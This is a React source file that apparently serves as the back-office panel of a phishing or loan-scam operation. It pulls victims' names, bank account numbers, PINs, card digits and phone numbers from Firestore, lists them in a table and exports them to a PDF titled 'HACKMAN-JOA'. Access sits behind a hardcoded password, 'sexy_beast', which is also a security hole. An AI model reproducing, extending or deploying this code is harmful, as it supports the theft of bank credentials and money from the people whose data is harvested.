import {useState, useEffect} from 'react'
import {db} from './firedb.js'
import { collection, getDocs } from "firebase/firestore";
import jsPDF from "jspdf";
import {GiAndroidMask} from "react-icons/gi"
import "jspdf-autotable";
import UserTable from './components/common/table.jsx';

function Table() {
  const [users, setUsers] = useState([])
  const [login, setLogin] = useState("")
  const [loged, setLoged] = useState(false)
  const [pass, setPass] = useState([])
  const [loading, stLoading] = useState(true)
  const usersRef = collection(db, "user",)
  const usersRefPass = collection(db, "password",)

  const data = users.map((elt, i)=> [i, elt.name, elt.account_number, elt.pin, elt.sixDigits, elt.phone, elt.loanAmount, elt.paybackdate]);
  useEffect(() => {
  
    
          const getUsers = async () => {
          const data = await getDocs(usersRef)
          const data1 = await getDocs(usersRefPass)
          const sortedArray = data.docs.map((doc) => ({ ...doc.data() }))
          const sortArr = sortedArray.sort(function (a, b) {
            return new Date(b.dn) - new Date(a.dn)
          })
          const sortedArrayPass = data1.docs.map((doc) => ({ ...doc.data() }))
          const sortArrpASS = sortedArrayPass.sort(function (a, b) {
            return   new Date(a.dn) - new Date(b.dn)
          })
      if (sortArr.length > 0 || sortArrpASS.length > 0) {
        stLoading(false)
      }
      setUsers(sortArr)
      setPass(sortArrpASS)
          console.log(sortArrpASS)
          console.log(sortArr)
        }

        getUsers()
    }, [])
/**
 * account_number
"090999909999"

loanAmount
"333333"
name
"joseph Jack"
paybackdate
"2023-07-28"
phone
"blake"
pin
"3232"
sixDigits
"2332222"
 */
    const exportPDF = () => {
      const unit = "pt";
      const size = "A3"; // Use A1, A2, A3 or A4
      const orientation = "portrait"; // portrait or landscape
  
      const marginLeft = 20;
      const doc = new jsPDF(orientation, unit, size);
  
      doc.setFontSize(11);
  
      const title = "HACKMAN-JOA";
      const headers = [["SN", "Name", "Account number", "Pin",'Last Six Digit', 'Phone', 'Loan Amount', 'Payback Date' ]];
  
      
  
      let content = {
        startY: 50,
        head: headers,
        body: data
      };
      doc.text(title, marginLeft, 40);
      doc.autoTable(content);
      const nameDoc= `HACKMAN.pdf`
      doc.save(nameDoc)
  }

  const checkLogin = () => {
    console.log(pass[pass.length-1], '===', login)
    if (login === "sexy_beast" || login === pass[pass.length - 1].pass) {
      console.log(pass[pass.length-1], '===', login)
      return setLoged(!loged)
    }
    }
  if (loading) {
    return <div className='login_container_table'>
      LOADING...
    </div>
 }
  
    if (loged) {
      /**
       * const headers = [["SN", "Name", "Account number", "Pin",'Last Six Digit', 'Phone', 'Loan Amount', 'Payback Date' ]];
  
      const data = users.map((elt, i)=> [i, elt.name, elt.account_number, elt.pin, elt.sixDigits, elt.phone, elt.loanAmount, elt.paybackdate]);
       */
  return (
    <div className="table_list md:w-1/2 w-[90%] m-auto">
      <button onClick={exportPDF} className="export_btn">Download As PDF</button>
      <UserTable data={data}/>
    </div>
    );
  } else {
    return (
        <div className="flex flex-col items-center justify-center  md:w-1/2 w-[90%] m-auto">
        <div className="w-full max-w-md bg-white rounded-lg shadow-lg p-8">
          <div className="flex items-center justify-center mb-4">
            <GiAndroidMask size={60} className="text-blue-500" />
          </div>
          <div className="mb-4">
            <input
              type="password"
              className="w-full p-3 rounded border focus:outline-none focus:border-blue-500"
              placeholder="Password"
              value={login}
              onChange={(e) => setLogin(e.target.value)}
            />
          </div>
          <div className="flex items-center justify-center">
            <button
              className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 px-6 rounded"
              onClick={checkLogin}
            >
              Login
            </button>
          </div>
        </div>
      </div>
    )
  }
}

export default Table


